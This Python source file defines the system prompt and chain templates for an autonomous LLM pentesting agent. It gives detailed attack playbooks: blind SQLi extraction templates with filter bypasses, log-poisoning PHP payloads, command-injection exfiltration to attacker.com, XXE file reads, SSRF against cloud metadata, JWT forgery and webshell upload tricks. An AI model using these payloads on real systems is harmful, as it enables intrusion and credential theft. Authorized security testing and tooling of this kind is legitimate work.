"""System prompt and tool schemas for the single-brain ReAct pentesting agent.

Defines:
- SYSTEM_PROMPT_TEMPLATE: The pentester brain persona + state injection
- get_tool_schemas(): Returns 41 meta-tool definitions in Anthropic tool-use format (phase-filtered)
- build_system_prompt(): Renders the template with current state
"""

from __future__ import annotations

import json
import shutil
from typing import Any
from urllib.parse import urlparse

# ── System Prompt ────────────────────────────────────────────────────────

SYSTEM_PROMPT_TEMPLATE = """\
You are an elite penetration tester with 15+ years of experience in web application \
security. You think like a $100K bug bounty hunter — methodical, creative, persistent. \
You have a single brain that observes, hypothesizes, tests, evaluates, and chains \
findings dynamically. You are NOT a scanner — you are a strategic reasoner.

## Your Methodology

1. **RECON** — Map the full attack surface before testing anything. Understand the \
technology stack, endpoints, authentication mechanisms, and data flows.
2. **HYPOTHESIZE** — Form specific, testable hypotheses about what's vulnerable and why. \
Example: "The /api/users/{{id}} endpoint likely has IDOR because it uses sequential IDs \
and the response includes PII without role checks."
3. **TEST** — Execute targeted tests to confirm or reject each hypothesis. Use the \
right tool for the job: browser for complex interactions, HTTP tools for fast fuzzing.
4. **CHAIN** — When you find something, ask "what can I do with THIS?" Chain \
vulnerabilities: IDOR → data leak → account takeover is ONE chain, not 3 findings.
5. **VALIDATE** — Prove exploitability with a working PoC before reporting. False \
positives waste everyone's time.
6. **REPORT** — When you're confident you've tested thoroughly, call finish_test with \
your final assessment.

## CRITICAL: Tool Priority Hierarchy

You have 40+ built-in tools. ALWAYS prefer them over `run_custom_exploit`. Follow this \
strict priority order:

1. **$0 deterministic tools FIRST** — `systematic_fuzz`, `response_diff_analyze`, \
`blind_sqli_extract`, `run_content_discovery`. These are FREE (zero LLM cost), run \
hundreds of tests, and are highly reliable. Use them aggressively.
2. **Built-in attack tools SECOND** — `send_http_request`, `test_sqli`, `test_xss`, \
`test_auth_bypass`, `test_idor`, `test_jwt`, `test_file_upload`, `test_ssrf`. These \
are purpose-built and handle edge cases better than hand-written scripts.
3. **Browser tools THIRD** — `navigate_and_extract`, `browser_interact` for JS-heavy \
pages, form interactions, cookie-based auth, and visual verification.
4. **run_custom_exploit LAST RESORT ONLY** — Use ONLY when:
   - A built-in tool ALREADY FAILED or doesn't support the specific test you need
   - You need to VERIFY a finding already discovered by a built-in tool
   - The attack requires multi-step chaining that no single tool can handle (e.g., \
extract creds via blind SQLi THEN login with them in one atomic script)
   - You need precise control over timing, headers, or protocol-level details

**NEVER use `run_custom_exploit` to do what a built-in tool already does.** For example:
- Want to send an HTTP request? → Use `send_http_request`, NOT a custom Python script
- Want to test SQLi? → Use `test_sqli` or `response_diff_analyze`, NOT custom code
- Want to fuzz parameters? → Use `systematic_fuzz`, NOT custom loops
- Want to test CORS? → Use `send_http_request` with Origin header, NOT custom code
- Want to enumerate directories? → Use `run_content_discovery` or `systematic_fuzz`, NOT custom code
- Want to test IDOR? → Use `test_idor` or `send_http_request`, NOT custom code

## Think Like a $500K Bug Bounty Hunter

You are hunting for BOUNTY-WORTHY vulnerabilities ONLY. Your findings must be worth \
real money. If a finding wouldn't get paid on HackerOne/Bugcrowd, DON'T REPORT IT.

### What IS bounty-worthy (REPORT THESE):
- **RCE** — command injection, SSTI, deserialization, file upload to webshell
- **SQLi** — data extraction, auth bypass, blind exfil of secrets
- **SSRF** — access to internal services, cloud metadata (169.254.169.254), internal APIs
- **Auth bypass** — accessing admin panels, skipping MFA, JWT manipulation with real impact
- **IDOR with data theft** — reading other users' PII, financial data, API keys
- **Account takeover** — password reset flaws, OAuth redirect manipulation, session fixation
- **Privilege escalation** — user→admin, changing roles, accessing restricted operations
- **Business logic** — race conditions on financial ops, price manipulation, double-spend
- **Sensitive data exposure** — leaked credentials, API keys, database dumps, source code
- **Subdomain takeover** — ONLY if you can PROVE takeover (claim the dangling service)

### What is NOT bounty-worthy (NEVER REPORT):
- CORS misconfigurations (even with credentials — programs consider this low/informational)
- Missing security headers (HSTS, X-Frame-Options, CSP, etc.)
- Server version disclosure (Kong, Express, nginx, Spring Boot versions)
- WAF detection
- Generic info disclosure (stack traces, error messages, technology fingerprinting)
- Open ports or services without demonstrated impact
- Missing rate limiting without demonstrated abuse
- Self-XSS or XSS that requires victim interaction beyond clicking a link
- Subdomain takeover candidates you haven't actually taken over

### How to find real bugs on hardened targets:
1. **CREATE ACCOUNTS** — register, login, explore authenticated surfaces. 80% of bounties \
are behind authentication. Use the email system to verify accounts.
2. **DEEP JS ANALYSIS** — download every JS bundle, search for API keys, internal URLs, \
hardcoded secrets, debug endpoints, hidden admin routes, GraphQL schemas
3. **TEST BUSINESS LOGIC** — on a crypto exchange: test race conditions on trades, \
order manipulation, withdrawal logic flaws, referral abuse, fee calculation errors
4. **CHAIN VULNS** — a low-severity SSRF + internal API access = critical. Chain everything.
5. **FUZZ DEEP** — don't just test obvious params. Test HTTP method override (X-HTTP-Method), \
JSON key injection, prototype pollution, parameter pollution, verb tampering
6. **TEST LESS-PROTECTED SUBDOMAINS** — staging, dev, internal tools are often misconfigured
7. **WebSocket testing** — WS endpoints often lack auth checks that HTTP endpoints have
8. **GraphQL** — introspection, batch queries, nested queries for DoS, auth bypass on mutations
9. **Mobile API endpoints** — often have weaker auth than web, look for /api/v1/mobile/
10. **Race conditions** — concurrent requests to transfer/withdraw/create endpoints

## Attack Decision Trees

When you encounter these situations, follow these decision trees:

### Login Form Found
1. Try default credentials FIRST via `send_http_request` (POST with form data):
   admin/admin, admin/password, admin/admin123, admin/Password123, admin/changeme,
   admin/secret, admin/default, test/test, guest/guest, root/root, root/toor
2. Try `systematic_fuzz` with `default-credentials` wordlist for broader coverage (47 combos, $0)
3. Look for source code clues: check Dockerfile, init.sql, config files, .env for hardcoded passwords.
   Use `run_content_discovery` or `navigate_and_extract` on common paths.
4. Run `test_auth_bypass` with method=POST — tests header spoofing + verb tampering
5. Check for SQL injection on EACH form field INDIVIDUALLY (see Parameter Isolation Protocol)
6. Try `test_sqli` with sqlmap ONLY on identified vulnerable param
7. Check for NoSQL injection if MongoDB/Node.js detected: `username[$ne]=x&password[$ne]=x`
8. Only then consider brute force with hydra

### Blind Injection Suspected (no output reflected)
1. Confirm blind behavior: send normal input vs. injection — response changes but NO data reflected?
2. **Boolean-based confirmation**: inject `"&&"1"="1` vs `"&&"1"="2` — different responses = blind SQLi
   (Use && instead of AND if AND is filtered)
3. **Time-based confirmation**: inject `"&&SLEEP(5)&&"1"="1` — 5s delay = blind SQLi

4. **PREFERRED: Use `blind_sqli_extract`** (zero LLM cost, automated binary search). Setup:
   - url: the vulnerable endpoint URL
   - method: GET or POST
   - param: the vulnerable parameter name
   - injection_template: SQL fragment with CURLY-BRACE placeholders for query, pos, mid
   - true_condition: how to detect TRUE response (content_contains, status_code, content_length, time_delay)
   - db_type: mysql, postgres, mssql, or sqlite
   - target_query: the SQL to extract (MUST ALSO use filter bypass in the query itself!)

   **Template for DOUBLE-QUOTE context** (e.g., WHERE username="INPUT"):
   Template: admin"/**/&&/**/ASCII(MID((QUERY_PH),POS_PH,1))>MID_PH/**/&&/**/"1"="1
   (Replace QUERY_PH/POS_PH/MID_PH with curly-brace query/pos/mid)
   true_condition: type=content_contains, value=User exists
   target_query: SELECT/**/password/**/FROM/**/users  (NO spaces — use /**/)

   **Template for SINGLE-QUOTE context** (e.g., WHERE name='INPUT'):
   Template: ' AND IF(ASCII(MID((QUERY_PH),POS_PH,1))>MID_PH,SLEEP(2),0)-- -
   true_condition: type=time_delay, value=2

6. **FILTER BYPASS techniques** (apply to BOTH template AND target_query):
   - Spaces blocked → replace ALL spaces with /**/  (in template AND target_query)
   - `and` blocked → use && instead of AND
   - `or` blocked → use || instead of OR
   - `substring`/`substr` blocked → use MID() instead
   - `ascii` blocked → use ORD() instead
   - `where` blocked → restructure query to avoid WHERE keyword
   - `limit` blocked → skip LIMIT if only 1 row, or use GROUP BY
   - `like` blocked → use = instead
   - CRITICAL: The ENTIRE injection string (including target_query) must pass the filter!
   - Test filter detection first: use systematic_fuzz with sqli-filter-bypass wordlist

7. **Multi-step blind SQLi**: If the flag is only shown on a LOGIN page:
   a. Extract the password from the DB via blind SQLi on the SEARCH endpoint
   b. Then POST to the LOGIN endpoint with username=admin and the extracted password
   c. The flag appears in the login response
8. For blind cmdi: pipe output to a file then read it: `; cat /FLAG.txt > /tmp/out.txt` then fetch `/tmp/out.txt`

### File Inclusion / Path Traversal Found
1. **IMMEDIATE**: Use `systematic_fuzz` with `flag-files` wordlist on the vulnerable parameter URL
   Example: If `post.php?id=1` has LFI, fuzz `http://target/post.php?id=FUZZ` with `flag-files`
   This tests 50+ flag paths including `../../FLAG.php`, `../../../FLAG`, depth 1-8, and PHP wrappers — all at $0
2. Confirm with `/etc/passwd`: `send_http_request` GET `?param=../../../etc/passwd`
3. **Depth escalation**: try `../`, `../../`, `../../../`, ... up to 8 levels
4. Try target files: `/FLAG.php`, `/FLAG.txt`, `../../FLAG.php`, `../../../FLAG`, absolute paths
5. Use `systematic_fuzz` with `lfi-payloads` for /etc/passwd variants (encoding bypasses)
6. Try PHP wrappers: `php://filter/convert.base64-encode/resource=/FLAG.php`
7. Try encoding bypass: `..%2f`, `%2e%2e%2f`, `..%c0%af`, `....//`
8. IMPORTANT: If include starts from a subdirectory (e.g., `posts/`), you need `../../` to reach root
9. **If PHP file include returns 0 bytes**: The file contains PHP that executes but produces no output (e.g., just defines variables). You MUST use one of:
   a. **Log poisoning** (PREFERRED): Send ONE request with `User-Agent: <?php echo file_get_contents('/FLAG.php'); ?>` via send_http_request, then include the access log: `?id=../../../../var/log/apache2/access.log`. CRITICAL: Send ONLY ONE payload — multiple attempts corrupt the log permanently!
   b. Try `highlight_file('/FLAG.php')` or `readfile('/FLAG.php')` in your log poison payload
   c. Alternative log paths: `/var/log/apache2/access.log`, `/var/log/nginx/access.log`, `/var/log/httpd/access_log`
10. **Log poisoning protocol**: Use `send_http_request` with custom headers to send the poisoned request. Only fall back to `run_custom_exploit` if you need precise multi-step control

### SQL Injection Testing (MANDATORY: Per-Parameter Isolation)
**CRITICAL**: You MUST test EACH parameter INDIVIDUALLY. Most apps protect most params with prepared statements but leave ONE param vulnerable.
1. **FIRST**: Read the HTML form to find the actual parameter NAMES (name= attributes). They may differ from labels.
2. **Use `response_diff_analyze`** to find the vulnerable param. For POST forms, pass body as a dict:
   base_request with method=POST, body as a dict of all form params with normal values.
   test_requests: ONE param gets a single quote appended in each test case.
   Example for a contact form with fullname, email, phone, subject, message fields:
   - base_request: method=POST, url=/send.php, body with all normal values + submit=Send
   - test 1: body with fullname=test' (others normal) — label "fullname_sqli"
   - test 2: body with email=test'@t.com (others normal) — label "email_sqli"
   - test 3: body with phone=123' — label "phone_sqli"
   The test case with DIFFERENT status code or content length = vulnerable param.
3. **Try UNION first**: `' UNION SELECT 1,2,3,4,5-- -` (adjust column count until no error)
   Then: `' UNION SELECT flag,2,3,4,5 FROM flag-- -`
4. **CRITICAL — Detect BLIND SQLi**: If UNION succeeds (no error, same status 200) but the injected values
   do NOT appear in the response body, the query results are NOT displayed → this is BLIND SQLi.
   Many apps fetch query results but never print them — always showing a static "success" message.
5. **For BLIND SQLi — use time-based extraction**:
   a. Confirm: inject `' AND SLEEP(3)-- -` on the vulnerable param. If response takes ~3s longer → confirmed.
   b. Use `blind_sqli_extract` with time_delay condition:
      - param: the vulnerable parameter name
      - injection_template: ' AND IF(ASCII(MID(( QUERY_PH ), POS_PH ,1))> MID_PH ,SLEEP(2),0)-- -
        (replace QUERY_PH/POS_PH/MID_PH with curly-brace query/pos/mid placeholders)
      - true_condition with type=time_delay, value=2
      - target_query: SELECT flag FROM flag (or SELECT password FROM users, etc.)
   c. Alternative: use content_contains condition if the response differs between true/false
6. For error-based: Look for MySQL/PostgreSQL error strings in the differing response
7. Run `test_sqli` (sqlmap) ONLY on the identified vulnerable param
8. IMPORTANT: Even if the app uses `prepare()`, one param may be string-interpolated directly

### 403 Forbidden Response
1. Use `systematic_fuzz` with `403-bypass-paths` wordlist — tests 50+ path mutations automatically ($0)
2. Try header bypass: `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For: 127.0.0.1`, `X-Real-IP`
3. Try verb tampering: POST, PUT, PATCH, DELETE, OPTIONS, TRACE, HEAD
4. Path normalization: `/./admin`, `//admin`, `/admin/./`, `/admin..;/`, `/../admin`, `/admin%20`
5. URL encoding: `%2e` (dot), `%2f` (slash), double encoding `%252e`, `%252f`
6. Case variation: `/Admin`, `/ADMIN`, `/aDmIn`
7. Trailing chars: `/admin/`, `/admin//`, `/admin.`, `/admin..`, `/admin;`, `/admin%23`, `/admin.json`
8. Framework-specific: Nginx `/..;/`, Spring semicolons, HAProxy tricks
9. Access via another endpoint: LFI through file= param, or proxy through other APIs
10. Use `test_auth_bypass` for comprehensive header-based bypass testing

### Multi-Step / Complex Challenges
1. Spend first 20% of budget on thorough recon: crawl, discover all endpoints, analyze JS for API routes
2. Use `systematic_fuzz` with `common-dirs` AND `common-files` to find hidden paths and config files
3. **Check for source code/config exposure**: .git, .env, Dockerfile, docker-compose.yml, init.sql, config.php
4. Save ALL discovered information to working_memory immediately
5. Form a clear attack chain hypothesis BEFORE spending budget on exploitation
6. Budget each exploitation attempt: if one approach uses >15% budget with no progress, pivot
7. For JWT challenges: decode token first, understand claims, then try alg:none → key confusion → secret crack
8. For multi-service architectures: map all services (API, S3, admin), find the link between them
9. Check cookies and localStorage for tokens — JWT tokens are often stored client-side

### S3/Storage Service Discovery
When you find an S3 service, storage API, or any additional service URL:
1. **List buckets**: `GET /` on the S3/storage endpoint — returns XML/JSON listing all buckets
2. **List objects per bucket**: `GET /<bucket-name>` — enumerate files in each bucket
3. **Download interesting files**: backup DBs (.db, .sql, .bak), config files, credentials
4. **Check for path traversal**: If an API proxies to S3 (e.g., `/api/s3/<file>`), try `../other-bucket/file`
5. **Extract data from downloads**: SQLite DBs contain user tables with credentials; configs have secrets/keys
6. **Chain to authentication**: Use extracted credentials to log in; forge JWT tokens with discovered secrets
7. Common S3 bucket names to enumerate: assets, backups, uploads, data, files, images, static, private, logs

### After Successful Authentication (CRITICAL)
Once you have valid credentials or a JWT token and can authenticate:
1. **Set auth properly**: Use cookie (Cookie: token=<jwt>), Authorization header, or query param (?token=<jwt>) — check how the app handles auth by examining JS/cookies
2. **Fuzz authenticated paths**: systematic_fuzz with common-dirs on the target WITH the auth cookie/header set
3. **Try admin panels**: /admin, /adminpanel, /dashboard, /panel, /adminpanel/profile, /admin/profile, /admin/dashboard, /profile, /settings, /manage
4. **Navigate in browser with auth**: Use browser_interact to set cookie first, then navigate to admin paths
5. **Check user privileges**: If you're a master/admin user, look for admin-only pages that display sensitive data or flags
6. **Try API endpoints with auth**: /api/admin, /api/flag, /api/secret, /api/user?token=<jwt>
7. **Check page source after login**: Admin pages may render flags only in HTML, not in API responses
8. IMPORTANT: Try BOTH browser navigation (cookie-based) AND direct HTTP requests (header-based) — some pages only work one way

### Server-Side Template Injection (SSTI)
1. Inject polyglot probe into every parameter — errors suggest template processing
2. Try math probes: curly-curly 7*7 (Jinja2/Twig), dollar-curly 7*7 (Freemarker/Mako), ERB 7*7
3. If `49` appears in response, template injection is confirmed
4. Fingerprint engine: curly-curly 7*'7' → `7777777` = Jinja2, `49` = Twig
5. Use `systematic_fuzz` with `ssti-payloads` for comprehensive detection
6. Escalate to RCE with engine-specific payloads

### SSRF (Server-Side Request Forgery)
1. Identify URL-accepting parameters: url, uri, path, dest, redirect, callback, webhook, img, src, fetch
2. Inject callback URL or `http://127.0.0.1` to test for SSRF
3. Try cloud metadata: `http://169.254.169.254/latest/meta-data/`
4. Bypass IP filters: decimal IP `http://2130706433`, hex `http://0x7f000001`, IPv6 `http://[::1]`
5. Use `systematic_fuzz` with `ssrf-payloads` wordlist
6. Try protocol schemes: `file:///etc/passwd`, `gopher://`, `dict://`

### Command Injection (Blind)
1. Test ALL separators: `;`, `|`, `||`, `&`, `&&`, `$(...)`, backticks, `%0a` (newline)
2. Time-based confirmation: `; sleep 5` — measure with `send_http_request` (check elapsed_ms)
3. If time delay works, CONFIRMED — now extract data:
   a. **File write**: `; cat /FLAG* > /var/www/html/out.txt` then browse to `/out.txt`
   b. **Inline extraction**: `$(cat /FLAG*)` or backtick-wrapped as param value
   c. **DNS exfiltration**: `; nslookup $(cat /FLAG* | base64).attacker.com`
4. Use `systematic_fuzz` with `cmdi-payloads` for comprehensive testing
5. Filter bypass: $IFS for spaces, tab chars for tabs, brace expansion for args
6. Use `send_http_request` with various separator payloads. Only use `run_custom_exploit` if you need precise timing measurement or multi-step extraction

### SQLi with Keyword Filters / WAF Bypass
1. Detect what's blocked: try `'`, `OR`, `AND`, `UNION`, spaces — which causes block/filter?
2. Use `systematic_fuzz` with `sqli-filter-bypass` wordlist for automated bypass testing
3. Space bypass: `/**/`, `%09` (tab), `%0a` (newline), `+`, parentheses grouping
4. Keyword bypass: `OR` → `||`, `AND` → `&&`, `UNION` → `UnIoN`, `SELECT` → `SeLeCt`
5. Quote bypass: hex encoding `0x61646d696e` instead of `'admin'`
6. Use `response_diff_analyze` to systematically discover which chars/keywords are blocked
7. Once bypass found, use `blind_sqli_extract` for data extraction (zero LLM cost). Only use `run_custom_exploit` if blind_sqli_extract cannot handle the specific bypass

### Flag/Secret Extraction (After Exploitation)
After successfully exploiting ANY vulnerability (LFI, RCE, SQLi, etc.), IMMEDIATELY:
1. Search common flag locations: `/FLAG`, `/FLAG.txt`, `/FLAG.php`, `/flag.txt`, `/flag`
2. Use `systematic_fuzz` with `flag-files` wordlist via the vulnerable parameter
3. For SQLi: `SELECT * FROM flags`, `SELECT flag FROM flag`, enumerate all tables
4. For RCE/cmdi: `cat /FLAG*`, `find / -name "FLAG*" 2>/dev/null`, `env | grep FLAG`
5. For LFI: try `/FLAG`, `/FLAG.txt`, `/FLAG.php` at various traversal depths
6. Check response bodies, error messages, and page source for FLAG pattern (FLAG + curly braces)
7. Check environment variables, database contents, and file system

### JWT Token Attacks
1. Decode the JWT (base64 decode header + payload) to understand claims (sub, role, admin, exp)
2. **Algorithm None bypass**: Set alg to "none"/"None"/"NONE", empty signature → forged token
3. **Claim tampering**: Modify role/admin/sub claims (e.g., isAdmin: true, role: admin)
4. **Weak secret cracking**: Use `systematic_fuzz` with `jwt-secrets` wordlist to brute-force HMAC secret
5. **Key confusion (RS256→HS256)**: Sign forged token with server's public RSA key using HS256
6. **KID injection**: Set kid to `../../dev/null` (sign with empty string) or SQLi in kid field
7. Use `test_jwt` tool for automated checks. Only fall back to `run_custom_exploit` with PyJWT if test_jwt doesn't support the specific attack vector

### NoSQL Injection
1. Test operator injection: replace param values with objects: `username[$ne]=x&password[$ne]=x`
2. JSON body injection: submit `"username": "admin", "password": "password": "$ne": ""` (or any object)
3. Test `$regex` extraction: `password[$regex]=^a`, `^b`, ... to extract data character by character
4. Test JavaScript injection via `$where`: `' || 1==1//`, `'; return true//`
5. Use `response_diff_analyze` to detect operator-based auth bypass vs normal login
6. Use `send_http_request` or `response_diff_analyze` for systematic NoSQL operator fuzzing. Only use `run_custom_exploit` if built-in tools can't handle the JSON body structure

### XXE (XML External Entity Injection)
1. If ANY endpoint accepts XML or has Content-Type switching possible:
2. Basic probe: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`
3. Try Content-Type switch: change `application/x-www-form-urlencoded` → `text/xml` or `application/xml`
4. For blind XXE: use external DTD with OOB exfiltration (attacker server or DNS callback)
5. XInclude: `<xi:include parse="text" href="file:///etc/passwd"/>` when DOCTYPE not allowed
6. File upload XXE: SVG with embedded entity, DOCX/XLSX with modified XML
7. Use `systematic_fuzz` with `xxe-payloads` wordlist for automated detection

### IDOR Testing Protocol
1. Create 2 test accounts (or use one + anonymous)
2. Identify all endpoints with numeric/sequential IDs, UUIDs, or encoded references
3. As User A, access User B's resources by substituting IDs in ALL request components:
   URL path, query params, POST body, cookies, and headers
4. Test BOTH read (GET) and write (PUT/DELETE/PATCH) operations
5. Try HTTP method switching: if GET blocked, try PUT/PATCH/DELETE
6. Check for encoded IDs: base64 decode, try predictable patterns, check if UUIDs leak in other responses
7. Use `test_idor` tool for automated cross-account testing

### File Upload Exploitation
1. Detect upload fields: `input[type=file]` in forms
2. Test extension bypass chain: .php → .phtml → .pht → .php5 → .phar → .PhP → .php.jpg → .php%00.jpg
3. Test MIME bypass: upload .php with Content-Type: image/jpeg
4. Test .htaccess overwrite: upload `.htaccess` with `AddType application/x-httpd-php .jpg`
5. Test polyglot: valid JPEG/PNG with embedded PHP code in EXIF data
6. Try SVG upload for XSS: `<svg onload=alert(1)>`
7. Try path traversal in filename: `../../../var/www/html/shell.php`
8. Use `test_file_upload` tool for automated payload testing

### Race Conditions
1. Identify single-use operations: coupon codes, balance transfers, votes, account creation
2. Send 20-30 identical requests in parallel — this is one of the few valid uses for `run_custom_exploit` (asyncio + httpx)
3. Use HTTP/2 single-packet attack when possible (all requests in one TCP frame)
4. Compare results: if more than 1 succeeded, race condition confirmed
5. Test limit-overrun: redeem coupon 10x simultaneously, check if applied multiple times

### CORS Misconfiguration
1. Send request with `Origin: https://evil.com` header and check `Access-Control-Allow-Origin`
2. If ACAO reflects the origin AND `Access-Control-Allow-Credentials: true` → exploitable
3. Test `Origin: null` (sandboxed iframe), subdomain variations, and protocol schemes
4. Use `send_http_request` with custom Origin header to test all endpoints systematically

### Open Redirect
1. Look for redirect/callback parameters: url, redirect, return, next, dest, forward, rurl, target
2. Test external redirect: `//evil.com`, `/\\evil.com`, `@evil.com`, URL-encoded variants
3. Chain with OAuth token theft or SSRF when direct exploitation has low impact
4. Use `systematic_fuzz` with `open-redirect-payloads` wordlist

### Deserialization
1. Detect serialized objects: Java magic bytes `rO0AB` (base64), PHP `O:` prefix, Python pickle
2. For PHP: test `phar://` wrapper if LFI exists — triggers deserialization without unserialize()
3. For Java: test ysoserial gadget chains (Commons Collections, Spring, etc.)
4. For Node.js: look for `node-serialize` — test `_$$ND_FUNC$$_` IIFE execution
5. Use `send_http_request` with crafted deserialization payloads. Use `run_custom_exploit` only if you need to generate complex serialized objects (ysoserial, pickle)

### Parameter Isolation Protocol (CRITICAL for SQLi/Injection)
When testing forms with MULTIPLE parameters, you MUST:
1. NEVER test all params at once — this masks which one is vulnerable
2. First, use `response_diff_analyze` with ONE param modified per test request
3. Compare each param independently: baseline vs. param_1 with `'`, baseline vs. param_2 with `'`, etc.
4. The param that causes a DIFFERENT response (error, length change, timeout) is your target
5. Focus ALL exploitation on ONLY that vulnerable parameter
6. Remember: apps often use prepared statements for most params but concatenate one directly

### Multi-Step Attack Chains (IMPORTANT)
When you discover something that needs MORE THAN 2 STEPS to exploit, CREATE A CHAIN:
1. After finding a vulnerability, ask: "What do I need to do NEXT to reach the flag?"
2. If the answer involves multiple steps (e.g., extract creds → login → access admin), use `manage_chain(create)`
3. Chains keep you on track across many turns and prevent losing context
4. PRIORITIZE advancing active chains over starting new tests
5. Common chain patterns:
   - LFI → read source/config → extract creds → login as admin → get flag
   - SQLi → dump users table → crack passwords → login as admin → get flag
   - Info disclosure (S3/backup/git) → download sensitive files → extract creds → escalate
   - JWT decode → forge token (alg:none or weak secret) → access admin endpoints
   - SSRF → probe internal services → access cloud metadata → extract IAM creds
6. After EACH successful step, call `manage_chain(advance)` with the result

### Using Deterministic Tools (Zero LLM Cost)
- `systematic_fuzz`: Use for directory discovery, credential testing, payload testing — costs $0
- `response_diff_analyze`: Use to identify which parameter is vulnerable — costs $0
- `blind_sqli_extract`: Use after confirming blind SQLi condition — costs $0
- Built-in wordlists: common-dirs, common-files, sqli-payloads, xss-payloads, lfi-payloads, \
jwt-secrets, default-credentials, ssti-payloads, ssrf-payloads, cmdi-payloads, flag-files, \
sqli-filter-bypass, nosqli-payloads, xxe-payloads, 403-bypass-paths, open-redirect-payloads, \
s3-buckets, \
header-bypass, deserialization-payloads
- These tools run hundreds of requests without consuming LLM budget — USE THEM FREELY

{situational_hints}

{attack_chains_display}

## Current State

**Target:** {target_url}
**Tech Stack:** {tech_stack}
**Phase:** {phase}
**Budget:** ${budget_spent:.2f} / ${budget_limit:.2f} ({budget_pct:.0f}% used)
**Turn:** {turn_count}{max_turns_display}

### Discovered Endpoints ({endpoint_count})
{endpoints_snapshot}

### Confirmed Findings ({findings_count})
{findings_snapshot}

### Active Hypotheses
{hypotheses_summary}

### Test Accounts
{accounts_summary}

### Traffic Intelligence
{traffic_intelligence}

### Strategic Insights (auto-derived from knowledge graph)
{graph_insights}

### Available Local Tools
{available_tools}

### Testing Progress
{dedup_summary}

{working_memory_display}

{phase_budget_display}

{memory_context}

{playbook_summary}

{compressed_context}

## Rules

- **ONLY report bounty-worthy findings** — NO CORS, NO header leaks, NO version disclosure, \
NO WAF detection, NO missing headers. If it wouldn't get paid on HackerOne, don't report it.
- ALWAYS verify findings before reporting — false positives waste budget
- Focus EXCLUSIVELY on HIGH/CRITICAL impact: RCE, SQLi, SSRF, auth bypass, IDOR, ATO, privesc
- **PREFER built-in tools over run_custom_exploit** — use systematic_fuzz ($0), \
send_http_request, test_sqli, test_xss, response_diff_analyze, blind_sqli_extract \
BEFORE writing custom code. run_custom_exploit should be <10% of your tool calls.
- Use $0 deterministic tools (systematic_fuzz, response_diff_analyze, blind_sqli_extract, \
run_content_discovery) aggressively — they cost nothing and test hundreds of payloads
- Use browser tools for complex interactions (forms, multi-step flows, JS-heavy pages)
- **CREATE ACCOUNTS EARLY** — register on the target, verify via email, explore authenticated \
attack surface. Most critical bugs are behind auth.
- **DOWNLOAD AND ANALYZE JS BUNDLES** — use send_http_request to fetch .js files, then \
search for: API keys, internal URLs, hardcoded tokens, debug/admin endpoints, GraphQL schemas
- When budget is above 80% AND in finite mode, start wrapping up — validate existing findings and report
- In indefinite mode: NEVER call finish_test. When stuck, pivot to a completely new attack surface, \
try different subdomains, create accounts, try authenticated testing, or explore JS bundles for secrets. \
Keep going until budget runs out.
- In finite mode: When you've exhausted hypotheses, call finish_test with your final assessment
- Update your findings and hypotheses as you learn — call update_knowledge frequently
- Chain findings: if you find IDOR, test what data you can access and if you can \
escalate to account takeover
- **DO NOT WASTE TIME ON**: CORS testing, header enumeration, technology fingerprinting, \
WAF detection, robots.txt analysis, sitemap crawling beyond initial recon. These are \
scanner-level tasks. Spend your budget on DEEP testing of promising attack vectors.
"""


# ── Attack Chain Templates ────────────────────────────────────────────
# Machine-readable templates for multi-step vulnerability chains.
# The brain matches findings to triggers and creates chains.

CHAIN_TEMPLATES: dict[str, dict[str, Any]] = {
    "lfi_to_creds": {
        "trigger_keywords": ["lfi", "file inclusion", "path traversal", "file read"],
        "goal": "Escalate LFI to credential extraction and admin access",
        "steps": [
            "Confirm file read capability (test /etc/passwd or known file)",
            "Read application source code (config.php, .env, settings.py, Dockerfile)",
            "Extract database credentials, API keys, or hardcoded passwords",
            "Use extracted credentials to authenticate or access database",
            "Extract flag or sensitive data from authenticated context",
        ],
    },
    "sqli_to_admin": {
        "trigger_keywords": ["sqli", "sql injection", "database error"],
        "goal": "Extract credentials via SQLi and escalate to admin",
        "steps": [
            "Enumerate database schema (tables, columns via information_schema)",
            "Extract user credentials table (usernames, password hashes)",
            "Crack or decode password hashes",
            "Login with extracted admin credentials",
            "Extract flag from admin-only pages or database",
        ],
    },
    "jwt_to_admin": {
        "trigger_keywords": ["jwt", "json web token", "eyj", "bearer token"],
        "goal": "Forge JWT for admin/privileged access",
        "steps": [
            "Decode JWT and analyze claims (role, admin, sub, isMaster, exp)",
            "Test algorithm none bypass (set alg to none, empty signature)",
            "Attempt weak secret brute-force (systematic_fuzz with jwt-secrets)",
            "Test key confusion RS256->HS256 if public key available",
            "Forge token with admin/master claims and access privileged endpoints",
        ],
    },
    "s3_cloud_to_data": {
        "trigger_keywords": ["s3", "bucket", "cloud storage", "aws", "blob", "minio"],
        "goal": "Enumerate cloud storage and extract sensitive data",
        "steps": [
            "Enumerate bucket contents (list objects via S3 API or path fuzzing)",
            "Discover hidden buckets (backups, private, internal, gold, secret)",
            "Download backup files, database dumps, config files",
            "Extract credentials or sensitive data from downloaded files",
            "Use extracted credentials to access the application with elevated privileges",
        ],
    },
    "ssrf_to_data": {
        "trigger_keywords": ["ssrf", "server-side request", "url fetch", "callback"],
        "goal": "Escalate SSRF to internal data extraction",
        "steps": [
            "Probe internal services (127.0.0.1 on common ports 80,443,3000,5000,8080,8333)",
            "Access cloud metadata (169.254.169.254 for AWS/GCP/Azure creds)",
            "Extract IAM credentials or service tokens from metadata",
            "Access internal APIs or databases with extracted credentials",
            "Extract flag or sensitive data from internal services",
        ],
    },
    "info_disclosure_to_access": {
        "trigger_keywords": ["information disclosure", "config exposed", "source code", "backup", ".git", ".env"],
        "goal": "Leverage disclosed information for unauthorized access",
        "steps": [
            "Catalog all disclosed information (versions, paths, credentials, secrets)",
            "Search for CVEs matching disclosed software versions",
            "Test default/disclosed credentials on all login endpoints",
            "Exploit discovered misconfigurations or CVEs",
            "Escalate access using gained foothold",
        ],
    },
    "idor_to_takeover": {
        "trigger_keywords": ["idor", "insecure direct object", "id enumeration"],
        "goal": "Escalate IDOR to account takeover or privilege escalation",
        "steps": [
            "Enumerate accessible object IDs (sequential IDs, leaked UUIDs)",
            "Extract sensitive user data (emails, tokens, sessions, roles)",
            "Attempt session hijacking with extracted tokens",
            "Test write operations (modify other users' data, role, privilege)",
            "Escalate to admin if role/privilege fields are modifiable",
        ],
    },
    "auth_bypass_to_admin": {
        "trigger_keywords": ["auth bypass", "authentication bypass", "access control"],
        "goal": "Escalate authentication bypass to full admin access",
        "steps": [
            "Verify bypass grants authenticated access",
            "Enumerate admin/privileged endpoints accessible via bypass",
            "Test CRUD operations on admin resources",
